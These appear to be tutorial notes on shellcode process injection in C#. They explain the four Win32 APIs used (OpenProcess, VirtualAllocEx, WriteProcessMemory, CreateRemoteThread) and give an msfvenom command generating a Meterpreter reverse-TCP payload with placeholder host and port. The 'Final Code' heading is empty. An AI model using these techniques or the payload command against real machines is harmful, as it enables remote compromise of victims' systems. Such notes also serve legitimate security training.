# Theory

Process : A Container that is created to house a running application. Each Windows Process maintains it's own virtual space, interaction between these spaces can take place with the help of Win32 APIs

Thread : Executes the compiled assembly code of an application. A process can have multiple threads, each thread has its own stack and shares the memory of the process.

Win32 APIs : _OpenProcess_ , _VirtualAllocEx_ , _WriteProcessMemory_ and _CreateRemoteThread_.

> All Processes have **Integrity level**. Higher integrity level process can interact with lower integrity process, but the reverse is not possible. This is done to prevent privilege escalation.

> We can check the integrity levels : Right click on exe > Properties > Security

&nbsp;

# Process Injection in C#

We'll be using 4 Win32 APIs from Kernel32.dll -

- _OpenProcess_ : To open a channel from one process to another.
- _VirtualAllocEx_ : To modify it's memory space and create a memory space for our shellcode.
- _WriteProcessMemory_ : Write the shellcode to the created memory space.
- _CreateRemoteThread_ : To execute the shellcode in a new thread in the memory space.

&nbsp;

Understanding each Function in-depth :

**_OpenProcess_**

Function :

    HANDLE OpenProcess(
        DWORD dwDesiredAccess,
        BOOL bInheritHandle,
        DWORD dwProcessId
    );

Explanation :

- The first argument _dwDesiredAccess_ is the access right we want to obtain, it's value will be cross checked with the security descriptor.
- The second argument _bInheritHandle_ tells if the child process can inherit this handle. If it's value is **TRUE**, processes created by this process will iherit this handle.
- The third argument _dwProcessId_ is the Process ID of the process in which we want to inject our shellcode.

> Documentation :
>
> - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
> - https://docs.microsoft.com/en-gb/windows/win32/procthread/process-security-and-access-rights

&nbsp;

**_VirtualAllocEx_**

Function :

    LPVOID VirtualAllocEx(
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD flAllocationType,
        DWORD flProtect
    );

Explanation :

- The first argument _hProcess_ is the process handle of the process.
- The second argument _lpAddress_ is the desired starting address in the allocated space.
- The third argument _dwSize_ sets the size of the allocated size.
- The dwSize contains the size of the buffer, in our case it is the size of our shellcode.
- The flAllocationType has the type of memory allocation(Types: MEM_COMMIT, MEM_RESERVE, MEM_RESET, MEM_RESET_UNDO)
- The flProtect has the memory Protections for the allocated memory

> Documentation :
>
> - https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
> - https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants

&nbsp;

**_WriteProcessMemory_**

Function :

    BOOL WriteProcessMemory(
        HANDLE hProcess,
        LPVOID lpBaseAddress,
        LPCVOID lpBuffer,
        SIZE_T nSize,
        SIZE_T *lpNumberOfBytesWritten
    );

Explanation :

- The first argument _hProcess_ is the process handle of the victim process.
- The second argument _lpBaseAddress_ is the address of the allocated memory address.
- The third argument _lpBuffer_ is the buffer of the shellcode.
- The fourth argument _nSize_ is the size of the buffer.
- The fifth argument _\*lpNumberOfBytesWritten_ is the pointer to a variable that recieves the number of bytes transferred. If set to NULL, the parameter is ignored.

> Documentation :
>
> - https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

&nbsp;

**_CreateRemoteThread_**

Function :

    HANDLE CreateRemoteThread(
        HANDLE hProcess,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        SIZE_T dwStackSize,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        DWORD dwCreationFlags,
        LPDWORD lpThreadId
    );

Explanation :

- The first argument _hProcess_ is the process handle of the victim process.
- The second argument _lpThreadAttributes_ is the desired security attributes
- The third argument is the initial size of the stack, we can set it to 0 to use the default values.
- The fourth argument _lpStartAddress_ is the starting address of the thread (address of the allocated buffer).
- The fifth argument _lpParameter_ is the pointer to a variable to be passed to the thread function.
- The sixth argument _dwCreationFlags_ controls the creation of the thread. It can have three values : 0, CREATE_SUSPENDED and STACK_SIZE_PARAM_IS_A_RESERVATION .
- The seventh argument _lpThreadId_ is a pointer to a variable that receives the thread identifier. If this parameter is NULL, the thread identifier is not returned.

> Documentation :
>
> - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread

&nbsp;

MSFVENOM COMMAND :

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f csharp EXITFUNC=thread

&nbsp;

Final Code :
